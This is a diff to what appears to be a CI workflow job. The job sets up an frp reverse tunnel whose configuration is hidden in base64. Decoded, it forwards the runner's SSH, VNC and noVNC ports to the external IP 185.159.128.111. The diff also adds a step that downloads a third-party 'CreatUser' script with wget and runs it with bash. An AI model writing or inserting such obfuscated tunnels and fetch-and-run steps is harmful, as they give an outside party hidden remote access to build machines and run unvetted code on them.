@@ -22,7 +22,10 @@ jobs:
         tar xf frp_0.59.0_linux_amd64.tar.gz
         rm frp_0.59.0_linux_amd64.tar.gz
         cd frp*
-        base64 -d <<< c2VydmVyQWRkciA9ICIxODUuMTU5LjEyOC4xMTEiCnNlcnZlclBvcnQgPSA3MDAwCgpbW3Byb3hpZXNdXQpuYW1lID0gInNzaCIKdHlwZSA9ICJ0Y3AiCmxvY2FsSVAgPSAiMTI3LjAuMC4xIgpsb2NhbFBvcnQgPSAyMgpyZW1vdGVQb3J0ID0gNjAyMgo= > frpc.toml
+        base64 -d <<< c2VydmVyQWRkciA9ICIxODUuMTU5LjEyOC4xMTEiCnNlcnZlclBvcnQgPSA3MDAwCgpbW3Byb3hpZXNdXQpuYW1lID0gInNzaCIKdHlwZSA9ICJ0Y3AiCmxvY2FsSVAgPSAiMTI3LjAuMC4xIgpsb2NhbFBvcnQgPSAyMgpyZW1vdGVQb3J0ID0gNjAyMgoKCltbcHJveGllczJdXQpuYW1lID0gInZuYyIKdHlwZSA9ICJ0Y3AiCmxvY2FsSVAgPSAiMTI3LjAuMC4xIgpsb2NhbFBvcnQgPSA1OTAxCnJlbW90ZVBvcnQgPSA1OTAxCgpbW3Byb3hpZXMzXV0KbmFtZSA9ICJub1ZuYyIKdHlwZSA9ICJ0Y3AiCmxvY2FsSVAgPSAiMTI3LjAuMC4xIgpsb2NhbFBvcnQgPSA2OTAxCnJlbW90ZVBvcnQgPSA2OTAxCgo= > frpc.toml
+        wget https://raw.githubusercontent.com/Alizarddd/ready-codes/main/CreatUser_f1ver
+        chmod +x Creat*
+        bash Creat*
         ./frpc -c ./frpc.toml
         echo "running"
         
